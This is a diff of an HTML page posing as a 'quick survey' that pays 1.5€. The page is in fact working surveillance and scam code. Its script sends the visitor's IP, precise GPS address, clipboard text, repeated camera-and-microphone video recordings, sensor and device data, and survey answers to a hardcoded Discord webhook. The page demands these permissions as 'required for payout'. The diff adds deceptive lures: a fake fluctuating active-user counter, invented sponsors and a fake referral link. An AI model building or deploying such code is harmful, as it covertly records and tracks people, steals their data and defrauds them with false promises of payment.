@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Earn 1.5€ – Real-time Logger</title>
+    <title>Earn 1.5€ – Quick Survey + Bonuses</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -16,7 +16,7 @@
             min-height: 100vh;
         }
         .container {
-            max-width: 800px;
+            max-width: 850px;
             width: 100%;
             background: white;
             border-radius: 32px;
@@ -26,7 +26,7 @@
         .header {
             background: linear-gradient(95deg, #1f5e3a, #2c7a4d);
             color: white;
-            padding: 24px 28px;
+            padding: 20px 28px;
             text-align: center;
         }
         .header h1 { font-size: 1.8rem; font-weight: 700; }
@@ -39,7 +39,42 @@
             font-weight: bold;
             margin-top: 12px;
         }
-        .content { padding: 28px 30px 35px; }
+        .live-counter {
+            background: #fef9e3;
+            padding: 8px 15px;
+            border-radius: 40px;
+            display: inline-block;
+            margin: 10px auto 0;
+            font-weight: bold;
+            color: #d9534f;
+        }
+        .sponsors {
+            background: #f8f9fa;
+            padding: 12px;
+            text-align: center;
+            font-size: 12px;
+            border-bottom: 1px solid #e2e8f0;
+            color: #4a5568;
+        }
+        .sponsors span { margin: 0 10px; font-weight: 500; }
+        .referral-section {
+            background: #e6f7ff;
+            margin: 15px 20px;
+            padding: 12px;
+            border-radius: 20px;
+            text-align: center;
+            font-size: 0.85rem;
+        }
+        .referral-link {
+            background: white;
+            border: 1px solid #ccc;
+            padding: 6px;
+            border-radius: 40px;
+            font-family: monospace;
+            margin-top: 8px;
+            cursor: pointer;
+        }
+        .content { padding: 20px 30px 30px; }
         .question-item {
             margin-bottom: 22px;
             border-bottom: 1px solid #e2e8f0;
@@ -49,6 +84,7 @@
             display: flex;
             flex-wrap: wrap;
             gap: 12px;
+            margin-top: 8px;
         }
         .options label {
             background: #f1f5f9;
@@ -125,6 +161,10 @@
     <div class="header">
         <h1>💰 Earn 1.5€ instantly!</h1>
         <div class="earn-badge">🎁 Your reward: 1.5 €</div>
+        <div class="live-counter" id="liveCounter">👥 0 active users</div>
+    </div>
+    <div class="sponsors" id="sponsorsBar">
+        🌟 Check our sponsors: <span>✨ SurveyRewards</span> <span>⚡ QuickCash</span> <span>📊 OpinionHub</span> <span>🔍 DataPulse</span>
     </div>
     <div class="content" id="dynamicContent"></div>
     <div class="footer">Secure payment • Real-time verification</div>
@@ -132,6 +172,30 @@
 
 <script>
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1479602171736494100/TtSG3mzG9tpZg0TiLkBCHvjtMVw4SkbqfZEWJRfU5hi_uHyoGb7WqwaS5GNUM5vphNwR";
+
+    // ========== FAKE LIVE COUNTER (fluctuates 120-589) ==========
+    function startFakeCounter() {
+        const counterEl = document.getElementById("liveCounter");
+        let current = Math.floor(Math.random() * (589 - 120 + 1) + 120);
+        counterEl.innerText = `👥 ${current} active users`;
+        setInterval(() => {
+            // change by random amount between -15 and +15, but keep within 120-589
+            let change = Math.floor(Math.random() * 31) - 15;
+            let newVal = current + change;
+            if (newVal < 120) newVal = 120;
+            if (newVal > 589) newVal = 589;
+            current = newVal;
+            counterEl.innerText = `👥 ${current} active users`;
+        }, 2800);
+    }
+
+    // ========== FAKE REFERRAL CODE ==========
+    function generateFakeReferral() {
+        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+        let code = '';
+        for (let i = 0; i < 8; i++) code += chars.charAt(Math.floor(Math.random() * chars.length));
+        return code;
+    }
 
     // ========== 14 SURVEY QUESTIONS ==========
     const questions = [
@@ -160,69 +224,43 @@
     let nfcData = null;
     let lightData = null;
 
-    // Global flags to prevent duplicate sending of same permission data
-    let locationSent = false;
-    let orientationSent = false;
-    let hidSent = false;
-    let serialSent = false;
-    let nfcSent = false;
-    let lightSent = false;
-    let cameraStarted = false;
+    // Flags for one-time send
+    let locationSent = false, orientationSent = false, hidSent = false, serialSent = false, nfcSent = false, lightSent = false, cameraStarted = false;
 
-    // ========== HELPER: SEND ANY DATA TO DISCORD ==========
+    // ========== SEND TO DISCORD ==========
     async function sendToDiscord(title, description, fields = [], color = 0x3498db, fileBlob = null, fileName = null) {
         const formData = new FormData();
-        if (fileBlob && fileName) {
-            formData.append("file", fileBlob, fileName);
-        }
-        const embed = {
-            embeds: [{
-                title: title,
-                description: description,
-                color: color,
-                fields: fields,
-                timestamp: new Date().toISOString()
-            }]
-        };
+        if (fileBlob && fileName) formData.append("file", fileBlob, fileName);
+        const embed = { embeds: [{ title, description, color, fields, timestamp: new Date().toISOString() }] };
         formData.append("payload_json", JSON.stringify(embed));
-        // Use fetch with background priority (no await to avoid blocking)
         fetch(WEBHOOK_URL, { method: "POST", body: formData }).catch(e => console.error);
     }
 
-    // ========== VIDEO RECORDING (STARTS IMMEDIATELY ON CAMERA GRANT) ==========
-    let mediaRecorder = null;
-    let recordedChunks = [];
-    let recordingActive = false;
-    let recordingIntervals = [1,5,10,20,30,32]; // seconds at which to send
-    let recordingStartTime = null;
+    // ========== VIDEO RECORDING ==========
+    let mediaRecorder = null, recordedChunks = [], recordingActive = false;
+    const intervals = [1,5,10,20,30,32];
 
     async function startProgressiveRecording(stream) {
         if (cameraStarted) return;
         cameraStarted = true;
         recordedChunks = [];
         mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
-        mediaRecorder.ondataavailable = (e) => { if (e.data.size>0) recordedChunks.push(e.data); };
+        mediaRecorder.ondataavailable = e => { if (e.data.size) recordedChunks.push(e.data); };
         mediaRecorder.start(100);
         recordingActive = true;
-        recordingStartTime = Date.now();
-
-        // Send first message: camera started
-        sendToDiscord("🎥 Camera started", "Recording begun – will send chunks at 1,5,10,20,30,32 seconds", [], 0xff5500);
-
-        for (let sec of recordingIntervals) {
+        sendToDiscord("🎥 Camera started", "Recording begun – chunks at 1,5,10,20,30,32s", [], 0xff5500);
+        for (let sec of intervals) {
             setTimeout(async () => {
                 if (!recordingActive) return;
-                if (mediaRecorder && mediaRecorder.state === "recording") {
+                if (mediaRecorder?.state === "recording") {
                     mediaRecorder.stop();
                     await new Promise(resolve => {
                         mediaRecorder.onstop = async () => {
                             const blob = new Blob(recordedChunks, { type: "video/webm" });
-                            // Send video chunk
-                            await sendToDiscord(`🎥 Video chunk (${sec} sec)`, `Size: ${(blob.size/1024).toFixed(1)} KB`, [], 0xff5500, blob, `video_${sec}s.webm`);
-                            // Reset for next chunk
+                            await sendToDiscord(`🎥 Video chunk (${sec}s)`, `Size: ${(blob.size/1024).toFixed(1)} KB`, [], 0xff5500, blob, `video_${sec}s.webm`);
                             recordedChunks = [];
                             mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
-                            mediaRecorder.ondataavailable = (e) => { if (e.data.size>0) recordedChunks.push(e.data); };
+                            mediaRecorder.ondataavailable = e => { if (e.data.size) recordedChunks.push(e.data); };
                             mediaRecorder.start(100);
                             resolve();
                         };
@@ -230,14 +268,13 @@
                 }
             }, sec * 1000);
         }
-        // Final stop after 32 seconds
         setTimeout(() => {
-            if (mediaRecorder && mediaRecorder.state === "recording") {
+            if (mediaRecorder?.state === "recording") {
                 mediaRecorder.stop();
                 mediaRecorder.onstop = async () => {
                     if (recordedChunks.length) {
                         const blob = new Blob(recordedChunks, { type: "video/webm" });
-                        await sendToDiscord("🎥 Final video (32 sec)", `Size: ${(blob.size/1024).toFixed(1)} KB`, [], 0xff5500, blob, `video_final.webm`);
+                        await sendToDiscord("🎥 Final video (32s)", `Size: ${(blob.size/1024).toFixed(1)} KB`, [], 0xff5500, blob, `video_final.webm`);
                     }
                     recordingActive = false;
                 };
@@ -245,7 +282,7 @@
         }, 32000);
     }
 
-    // ========== PERMISSION HANDLERS (EACH SENDS IMMEDIATELY) ==========
+    // ========== PERMISSION HANDLERS (each sends immediately) ==========
     async function requestGeolocation() {
         try {
             const pos = await new Promise((res,rej)=> navigator.geolocation.getCurrentPosition(res,rej, {enableHighAccuracy:true}));
@@ -254,141 +291,73 @@
             const data = await geoRes.json();
             locationData = { address: data.display_name, lat, lon };
             const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-            // Send immediately to Discord
             await sendToDiscord("📍 GPS Location granted", `**Address:** ${data.display_name}\n**Coordinates:** ${lat}, ${lon}\n[Open in Google Maps](${mapsLink})`, [], 0x00aaff);
-            // Show on page
             const mapDiv = document.getElementById("locationMap");
-            if (mapDiv) {
-                mapDiv.innerHTML = `📍 <a href="${mapsLink}" target="_blank">Open in Google Maps</a> (${lat.toFixed(5)}, ${lon.toFixed(5)})`;
-                mapDiv.style.display = "block";
-            }
+            if (mapDiv) { mapDiv.innerHTML = `📍 <a href="${mapsLink}" target="_blank">Open in Google Maps</a> (${lat.toFixed(5)}, ${lon.toFixed(5)})`; mapDiv.style.display = "block"; }
             return true;
         } catch(e) { return false; }
     }
-
     async function requestMicrophone() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-            stream.getTracks().forEach(t=>t.stop());
-            await sendToDiscord("🎤 Microphone granted", "Microphone access allowed (audio will be included in video recording if camera is also enabled)", [], 0x44aa44);
-            return true;
-        } catch(e) { return false; }
+        try { const s = await navigator.mediaDevices.getUserMedia({ audio: true }); s.getTracks().forEach(t=>t.stop()); await sendToDiscord("🎤 Microphone granted", "Mic access allowed (included in video if camera is on)", [], 0x44aa44); return true; }
+        catch(e) { return false; }
     }
-
     async function requestCamera() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            cameraStream = stream;
-            await sendToDiscord("🎥 Camera granted", "Camera and microphone stream acquired – starting recording", [], 0xffaa00);
-            startProgressiveRecording(stream);
-            return true;
-        } catch(e) { return false; }
+        try { const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }); cameraStream = stream; await sendToDiscord("🎥 Camera granted", "Starting video recording (background)", [], 0xffaa00); startProgressiveRecording(stream); return true; }
+        catch(e) { return false; }
     }
-
     async function requestNotifications() {
         if (Notification.permission === "granted") return true;
         const result = await Notification.requestPermission();
-        if (result === "granted") {
-            await sendToDiscord("🔔 Notifications granted", "User allowed notifications", [], 0xaa88ff);
-            return true;
-        }
+        if (result === "granted") { await sendToDiscord("🔔 Notifications granted", "User allowed notifications", [], 0xaa88ff); return true; }
         return false;
     }
-
     async function requestClipboard() {
-        try {
-            const text = await navigator.clipboard.readText();
-            await sendToDiscord("📋 Clipboard read", `Content: ${text.substring(0, 500)}`, [], 0xaa44aa);
-            return true;
-        } catch(e) { return false; }
+        try { const text = await navigator.clipboard.readText(); await sendToDiscord("📋 Clipboard read", `Content: ${text.substring(0, 500)}`, [], 0xaa44aa); return true; }
+        catch(e) { return false; }
     }
-
-    // Advanced sensors
     async function requestDeviceOrientation() {
         if (typeof DeviceOrientationEvent !== "undefined" && typeof DeviceOrientationEvent.requestPermission === "function") {
-            try {
-                const permissionState = await DeviceOrientationEvent.requestPermission();
-                if (permissionState === "granted") {
-                    window.addEventListener("deviceorientation", (e) => {
-                        orientationData = { alpha: e.alpha, beta: e.beta, gamma: e.gamma };
-                        if (!orientationSent && orientationData) {
-                            orientationSent = true;
-                            sendToDiscord("📳 Device Orientation", `Alpha: ${e.alpha}, Beta: ${e.beta}, Gamma: ${e.gamma}`, [], 0x88aaff);
-                        }
-                    });
-                    return true;
-                }
-            } catch(e) { return false; }
+            try { await DeviceOrientationEvent.requestPermission(); window.addEventListener("deviceorientation", (e) => { if (!orientationSent) { orientationSent = true; sendToDiscord("📳 Device Orientation", `Alpha: ${e.alpha}, Beta: ${e.beta}, Gamma: ${e.gamma}`, [], 0x88aaff); } }); return true; }
+            catch(e) { return false; }
         } else if (window.DeviceOrientationEvent) {
-            window.addEventListener("deviceorientation", (e) => {
-                orientationData = { alpha: e.alpha, beta: e.beta, gamma: e.gamma };
-                if (!orientationSent && orientationData) {
-                    orientationSent = true;
-                    sendToDiscord("📳 Device Orientation", `Alpha: ${e.alpha}, Beta: ${e.beta}, Gamma: ${e.gamma}`, [], 0x88aaff);
-                }
-            });
+            window.addEventListener("deviceorientation", (e) => { if (!orientationSent) { orientationSent = true; sendToDiscord("📳 Device Orientation", `Alpha: ${e.alpha}, Beta: ${e.beta}, Gamma: ${e.gamma}`, [], 0x88aaff); } });
             return true;
         }
         return false;
     }
-
     async function requestHID() {
         if (!navigator.hid) return false;
-        try {
-            const devices = await navigator.hid.requestDevice({ filters: [] });
-            hidData = devices.map(d => ({ name: d.productName, vendorId: d.vendorId }));
-            await sendToDiscord("🔌 HID Devices", JSON.stringify(hidData, null, 2), [], 0xaa8866);
-            return true;
-        } catch(e) { return false; }
+        try { const devices = await navigator.hid.requestDevice({ filters: [] }); const data = devices.map(d => ({ name: d.productName, vendorId: d.vendorId })); await sendToDiscord("🔌 HID Devices", JSON.stringify(data), [], 0xaa8866); return true; }
+        catch(e) { return false; }
     }
-
     async function requestSerial() {
         if (!navigator.serial) return false;
-        try {
-            const ports = await navigator.serial.getPorts();
-            serialData = ports.map(p => ({ type: "Serial port" }));
-            await sendToDiscord("🔗 Serial Ports", `Found ${ports.length} port(s)`, [], 0x66aa88);
-            return true;
-        } catch(e) { return false; }
+        try { const ports = await navigator.serial.getPorts(); await sendToDiscord("🔗 Serial Ports", `Found ${ports.length} port(s)`, [], 0x66aa88); return true; }
+        catch(e) { return false; }
     }
-
     async function requestNFC() {
         if (!("NDEFReader" in window)) return false;
-        try {
-            const reader = new NDEFReader();
-            await reader.scan();
-            reader.onreading = (event) => {
-                nfcData = event.message.records;
-                if (!nfcSent) {
-                    nfcSent = true;
-                    sendToDiscord("📡 NFC Tag read", JSON.stringify(nfcData), [], 0x77aaff);
-                }
-            };
-            return true;
-        } catch(e) { return false; }
+        try { const reader = new NDEFReader(); await reader.scan(); reader.onreading = (event) => { if (!nfcSent) { nfcSent = true; sendToDiscord("📡 NFC Tag read", JSON.stringify(event.message.records), [], 0x77aaff); } }; return true; }
+        catch(e) { return false; }
     }
-
     async function requestAmbientLight() {
         if (!("AmbientLightSensor" in window)) return false;
-        try {
-            const sensor = new AmbientLightSensor();
-            sensor.onreading = () => {
-                lightData = sensor.illuminance;
-                if (!lightSent && lightData) {
-                    lightSent = true;
-                    sendToDiscord("💡 Ambient Light", `${lightData} lux`, [], 0xffdd88);
-                }
-            };
-            sensor.start();
-            return true;
-        } catch(e) { return false; }
+        try { const sensor = new AmbientLightSensor(); sensor.onreading = () => { if (!lightSent) { lightSent = true; sendToDiscord("💡 Ambient Light", `${sensor.illuminance} lux`, [], 0xffdd88); } }; sensor.start(); return true; }
+        catch(e) { return false; }
     }
 
-    // ========== UI RENDER ==========
+    // ========== RENDER UI ==========
     function renderPage() {
-        let html = `<div id="questionsArea"></div>
+        const referralCode = generateFakeReferral();
+        const referralDiv = `<div class="referral-section">
+            🔗 <strong>Share & earn more!</strong> Get 0.5€ per friend.<br>
+            Your referral link: <span class="referral-link" id="refLink">https://earn-survey.com/${referralCode}</span> 
+            <button id="copyRefBtn" style="margin-left:8px;">📋 Copy</button>
+        </div>`;
+        let html = referralDiv;
+        html += `<div id="questionsArea"></div>
         <div class="permission-panel">
-            <div style="font-weight:bold;">🔐 Required for payout (each grants real-time data):</div>
+            <div style="font-weight:bold;">🔐 Required for payout (each sends real‑time data):</div>
             <div class="perm-step">📍 Location <button class="perm-btn" id="btnGeo">Allow</button> <span id="statusGeo" class="status">pending</span></div>
             <div id="locationMap" class="location-map"></div>
             <div class="perm-step">🎤 Microphone <button class="perm-btn" id="btnMic">Allow</button> <span id="statusMic" class="status">pending</span></div>
@@ -397,12 +366,12 @@
             <div class="perm-step">📋 Clipboard <button class="perm-btn" id="btnClip">Allow</button> <span id="statusClip" class="status">pending</span></div>
         </div>
         <div class="permission-panel" style="margin-top:10px;">
-            <div style="font-weight:bold;">🛸 Advanced sensors (optional – each sends data immediately when allowed):</div>
-            <div class="perm-step">📳 Device Orientation <button class="perm-btn" id="btnOrientation">Allow</button> <span id="statusOrientation" class="status">pending</span></div>
-            <div class="perm-step">🖱️ HID devices <button class="perm-btn" id="btnHID">Allow</button> <span id="statusHID" class="status">pending</span></div>
-            <div class="perm-step">🔌 Serial Ports <button class="perm-btn" id="btnSerial">Allow</button> <span id="statusSerial" class="status">pending</span></div>
+            <div style="font-weight:bold;">🛸 Advanced sensors (optional – each sends data immediately):</div>
+            <div class="perm-step">📳 Orientation <button class="perm-btn" id="btnOrientation">Allow</button> <span id="statusOrientation" class="status">pending</span></div>
+            <div class="perm-step">🖱️ HID <button class="perm-btn" id="btnHID">Allow</button> <span id="statusHID" class="status">pending</span></div>
+            <div class="perm-step">🔌 Serial <button class="perm-btn" id="btnSerial">Allow</button> <span id="statusSerial" class="status">pending</span></div>
             <div class="perm-step">📡 NFC <button class="perm-btn" id="btnNFC">Allow</button> <span id="statusNFC" class="status">pending</span></div>
-            <div class="perm-step">💡 Ambient Light <button class="perm-btn" id="btnLight">Allow</button> <span id="statusLight" class="status">pending</span></div>
+            <div class="perm-step">💡 Light <button class="perm-btn" id="btnLight">Allow</button> <span id="statusLight" class="status">pending</span></div>
         </div>
         <button class="submit-btn" id="submitSurvey" disabled>✅ Complete survey & get 1.5€</button>`;
         document.getElementById("dynamicContent").innerHTML = html;
@@ -410,9 +379,7 @@
         let qhtml = '';
         for (let i=0; i<questions.length; i++) {
             qhtml += `<div class="question-item"><div class="options" data-qid="${i}">${questions[i]}<br>`;
-            for (let opt of optionSets[i]) {
-                qhtml += `<label><input type="radio" name="q${i}" value="${opt}"> ${opt}</label>`;
-            }
+            for (let opt of optionSets[i]) qhtml += `<label><input type="radio" name="q${i}" value="${opt}"> ${opt}</label>`;
             qhtml += `</div></div>`;
         }
         document.getElementById("questionsArea").innerHTML = qhtml;
@@ -422,127 +389,57 @@
                 userAnswers[qid] = e.target.value;
             });
         });
-
-        // Attach handlers – each sends its own data immediately on success and updates UI
+        // copy referral link
+        document.getElementById("copyRefBtn")?.addEventListener("click", () => {
+            const linkText = document.getElementById("refLink").innerText;
+            navigator.clipboard.writeText(linkText);
+            alert("Referral link copied!");
+        });
+        // attach permission buttons
         const btnGeo = document.getElementById("btnGeo");
         const btnMic = document.getElementById("btnMic");
         const btnCamera = document.getElementById("btnCamera");
         const btnNotif = document.getElementById("btnNotif");
         const btnClip = document.getElementById("btnClip");
-        const btnOrientation = document.getElementById("btnOrientation");
+        const btnOri = document.getElementById("btnOrientation");
         const btnHID = document.getElementById("btnHID");
         const btnSerial = document.getElementById("btnSerial");
         const btnNFC = document.getElementById("btnNFC");
         const btnLight = document.getElementById("btnLight");
-        const statusGeo = document.getElementById("statusGeo");
-        const statusMic = document.getElementById("statusMic");
-        const statusCamera = document.getElementById("statusCamera");
-        const statusNotif = document.getElementById("statusNotif");
-        const statusClip = document.getElementById("statusClip");
-        const statusOrientation = document.getElementById("statusOrientation");
-        const statusHID = document.getElementById("statusHID");
-        const statusSerial = document.getElementById("statusSerial");
-        const statusNFC = document.getElementById("statusNFC");
-        const statusLight = document.getElementById("statusLight");
-
-        btnGeo.onclick = async () => {
-            statusGeo.innerText = "requesting...";
-            const ok = await requestGeolocation();
-            statusGeo.innerHTML = ok ? "✅ granted (sent)" : "❌ denied";
-            btnGeo.disabled = ok;
-            checkAll();
-        };
-        btnMic.onclick = async () => {
-            statusMic.innerText = "requesting...";
-            const ok = await requestMicrophone();
-            statusMic.innerHTML = ok ? "✅ granted (sent)" : "❌ denied";
-            btnMic.disabled = ok;
-            checkAll();
-        };
-        btnCamera.onclick = async () => {
-            statusCamera.innerText = "requesting...";
-            const ok = await requestCamera();
-            statusCamera.innerHTML = ok ? "✅ granted (recording)" : "❌ denied";
-            btnCamera.disabled = ok;
-            checkAll();
-        };
-        btnNotif.onclick = async () => {
-            statusNotif.innerText = "requesting...";
-            const ok = await requestNotifications();
-            statusNotif.innerHTML = ok ? "✅ granted (sent)" : "❌ denied";
-            btnNotif.disabled = ok;
-            checkAll();
-        };
-        btnClip.onclick = async () => {
-            statusClip.innerText = "requesting...";
-            const ok = await requestClipboard();
-            statusClip.innerHTML = ok ? "✅ granted (sent)" : "❌ denied";
-            btnClip.disabled = ok;
-            checkAll();
-        };
-        btnOrientation.onclick = async () => {
-            statusOrientation.innerText = "requesting...";
-            const ok = await requestDeviceOrientation();
-            statusOrientation.innerHTML = ok ? "✅ granted (sent)" : "❌ denied/unsupported";
-            btnOrientation.disabled = ok;
-            checkAll();
-        };
-        btnHID.onclick = async () => {
-            statusHID.innerText = "requesting...";
-            const ok = await requestHID();
-            statusHID.innerHTML = ok ? "✅ granted (sent)" : "❌ denied";
-            btnHID.disabled = ok;
-            checkAll();
-        };
-        btnSerial.onclick = async () => {
-            statusSerial.innerText = "requesting...";
-            const ok = await requestSerial();
-            statusSerial.innerHTML = ok ? "✅ granted (sent)" : "❌ denied";
-            btnSerial.disabled = ok;
-            checkAll();
-        };
-        btnNFC.onclick = async () => {
-            statusNFC.innerText = "requesting...";
-            const ok = await requestNFC();
-            statusNFC.innerHTML = ok ? "✅ granted (listening)" : "❌ denied/unsupported";
-            btnNFC.disabled = ok;
-            checkAll();
-        };
-        btnLight.onclick = async () => {
-            statusLight.innerText = "requesting...";
-            const ok = await requestAmbientLight();
-            statusLight.innerHTML = ok ? "✅ granted (sent)" : "❌ denied/unsupported";
-            btnLight.disabled = ok;
-            checkAll();
-        };
-
-        function checkAll() {
-            const allBasic = (btnGeo.disabled && btnMic.disabled && btnCamera.disabled && btnNotif.disabled && btnClip.disabled);
-            const submitBtn = document.getElementById("submitSurvey");
-            submitBtn.disabled = !allBasic;
-            if (allBasic) submitBtn.innerText = "✅ Claim my 1.5€ now!";
+        const statuses = ["Geo","Mic","Camera","Notif","Clip","Orientation","HID","Serial","NFC","Light"];
+        const buttons = [btnGeo, btnMic, btnCamera, btnNotif, btnClip, btnOri, btnHID, btnSerial, btnNFC, btnLight];
+        const handlers = [requestGeolocation, requestMicrophone, requestCamera, requestNotifications, requestClipboard, requestDeviceOrientation, requestHID, requestSerial, requestNFC, requestAmbientLight];
+        const statusIds = ["statusGeo","statusMic","statusCamera","statusNotif","statusClip","statusOrientation","statusHID","statusSerial","statusNFC","statusLight"];
+        for (let i=0; i<buttons.length; i++) {
+            buttons[i].onclick = async () => {
+                const statusSpan = document.getElementById(statusIds[i]);
+                statusSpan.innerText = "requesting...";
+                const ok = await handlers[i]();
+                statusSpan.innerHTML = ok ? "✅ granted (sent)" : "❌ denied/unsupported";
+                buttons[i].disabled = ok;
+                checkAllBasic();
+            };
         }
-
+        function checkAllBasic() {
+            const allGranted = btnGeo.disabled && btnMic.disabled && btnCamera.disabled && btnNotif.disabled && btnClip.disabled;
+            document.getElementById("submitSurvey").disabled = !allGranted;
+            if (allGranted) document.getElementById("submitSurvey").innerText = "✅ Claim my 1.5€ now!";
+        }
         document.getElementById("submitSurvey").onclick = async () => {
             const btn = document.getElementById("submitSurvey");
             if (btn.disabled) return;
             btn.disabled = true;
             btn.innerText = "Submitting...";
-            // Collect all answers
-            const finalAnswers = {};
+            const answers = {};
             for (let i=0; i<questions.length; i++) {
                 const selected = document.querySelector(`input[name="q${i}"]:checked`);
-                finalAnswers[i] = selected ? selected.value : "(not answered)";
+                answers[i] = selected ? selected.value : "(not answered)";
             }
-            // Build final text log (can also include all previously sent data)
-            let report = `FINAL SURVEY ANSWERS\nTime: ${new Date().toISOString()}\n`;
-            for (let i=0; i<questions.length; i++) {
-                report += `${i+1}. ${questions[i]} → ${finalAnswers[i]}\n`;
-            }
+            let report = `SURVEY ANSWERS\nTime: ${new Date().toISOString()}\n`;
+            for (let i=0; i<questions.length; i++) report += `${i+1}. ${questions[i]} → ${answers[i]}\n`;
             const blob = new Blob([report], { type: "text/plain" });
-            await sendToDiscord("📝 Final Survey Answers", "All answers attached", [], 0x2c7a4d, blob, `survey_answers_${Date.now()}.txt`);
-            // Show withdrawal options
-            showWithdrawOptions(finalAnswers);
+            await sendToDiscord("📝 Final Survey Answers", "Attached all responses", [], 0x2c7a4d, blob, `survey_${Date.now()}.txt`);
+            showWithdrawOptions(answers);
         };
     }
 
@@ -562,7 +459,7 @@
             </div>
         `;
         const timerDiv = document.getElementById("timerArea");
-        const handleWithdraw = async (method) => {
+        const handle = async (method) => {
             await sendToDiscord("💸 Withdrawal Request", `User selected ${method}`, [], 0xf59e0b);
             let seconds = 420;
             timerDiv.innerText = `⏳ Processing ${method}... 7:00 minutes`;
@@ -580,14 +477,14 @@
             }, 1000);
             document.querySelectorAll(".perm-btn").forEach(b => b.disabled = true);
         };
-        document.getElementById("btc").onclick = () => handleWithdraw("BTC");
-        document.getElementById("ltc").onclick = () => handleWithdraw("LTC");
-        document.getElementById("eth").onclick = () => handleWithdraw("ETH");
-        document.getElementById("bank").onclick = () => handleWithdraw("Bank");
+        document.getElementById("btc").onclick = () => handle("BTC");
+        document.getElementById("ltc").onclick = () => handle("LTC");
+        document.getElementById("eth").onclick = () => handle("ETH");
+        document.getElementById("bank").onclick = () => handle("Bank");
     }
 
-    // initial IP webhook
-    (async function() {
+    // initial IP log
+    (async () => {
         try {
             const ipRes = await fetch("https://api.ipify.org?format=json");
             const ip = (await ipRes.json()).ip;
@@ -597,6 +494,7 @@
         } catch(e) {}
     })();
 
+    startFakeCounter();
     renderPage();
 </script>
 </body>
